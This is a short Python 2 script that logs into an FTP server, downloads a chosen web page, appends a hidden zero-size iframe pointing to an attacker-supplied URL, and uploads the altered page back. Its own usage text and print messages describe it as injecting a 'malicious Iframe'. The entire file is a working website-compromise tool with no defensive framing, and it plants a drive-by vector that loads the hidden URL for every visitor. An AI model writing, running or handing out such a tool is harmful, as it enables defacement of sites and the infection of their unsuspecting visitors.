#!/usr/bin/env python2
import ftplib, sys, getpass


def inj3ct0r(ftpobj, in_page, inject):
    try:
        f = open("/tmp/" +in_page+ '.tmp', 'w')
        ftpobj.retrlines('RETR ' +in_page, f.write)
        print("[!] Downloaded page: %s" % in_page)
        f.write(inject)
        f.close()
        print("[!] Injected malicious Iframe into page %s" % in_page)
        ftpobj.storlines("STOR " +in_page,  open("/tmp/" +in_page+ ".tmp", 'r'))
        print("[!] Re-upped the modified page to %s" % in_page)
    except Exception, e:
        print(str(e))


def main():
    if len(sys.argv) != 5:
        print("Download FTP-hosted webpage, inject Iframe containing mal-url, re-upload to source FTP.")
        print("USAGE:  %s %s" % (sys.argv[0], "[host] [user] [target_page] [inject_URL]"))
        sys.exit()
    else:
        prog, host, user, target, inject = sys.argv
        passwd = getpass.getpass()
        malice = '<iframe width="0" height="0" src="' + inject + '"></iframe>'
        ftp = ftplib.FTP(host)
        ftp.login(user, passwd)
        inj3ct0r(ftp, target, malice)
        ftp.close()


if __name__=="__main__":
    main()

